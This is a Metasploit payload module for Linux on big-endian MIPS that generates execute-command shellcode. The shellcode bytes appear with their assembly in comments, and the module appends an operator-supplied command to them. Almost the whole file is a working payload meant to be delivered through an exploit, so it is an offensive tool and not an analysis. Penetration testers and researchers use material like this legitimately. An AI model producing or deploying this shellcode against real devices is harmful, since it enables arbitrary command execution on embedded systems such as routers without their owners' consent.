##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 52

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => %q{
                A very small shellcode for executing commands.
                This module is sometimes helpful for testing purposes.
         },
      'Author'        =>
        [
          'Michael Messner <devnull[at]s3cur1ty.de>', #metasploit payload
          'entropy@phiral.net'  #original payload
        ],
      'References'    =>
        [
          ['EDB', '17940']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSBE,
      'Payload'       =>
        {
          'Offsets' => {} ,
          'Payload' => ''
        })
    )
    register_options(
      [
        OptString.new('CMD', [ true, "The command string to execute" ]),
      ])
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    return datastore['CMD'] || ''
  end

  def generate

    shellcode =
      "\x24\x06\x06\x66" + #li a2,1638
      "\x04\xd0\xff\xff" + #bltzal a2,4100b4
      "\x28\x06\xff\xff" + #slti a2,zero,-1
      "\x27\xbd\xff\xe0" + #addiu sp,sp,-32
      "\x27\xe4\x10\x01" + #addiu a0,ra,4097
      "\x24\x84\xf0\x1f" + #addiu a0,a0,-4065
      "\xaf\xa4\xff\xe8" + #sw a0,-24(sp)
      "\xaf\xa0\xff\xec" + #sw zero,-20(sp)
      "\x27\xa5\xff\xe8" + #addiu a1,sp,-24
      "\x24\x02\x0f\xab" + #li v0,4011
      "\x01\x01\x01\x0c"   #syscall 0x40404

    #
    # Constructs the payload
    #

    shellcode = shellcode + command_string + "\x00"

    # we need to align our shellcode to 4 bytes
    (shellcode = shellcode + "\x00") while shellcode.length%4 != 0

    return super + shellcode

  end
end
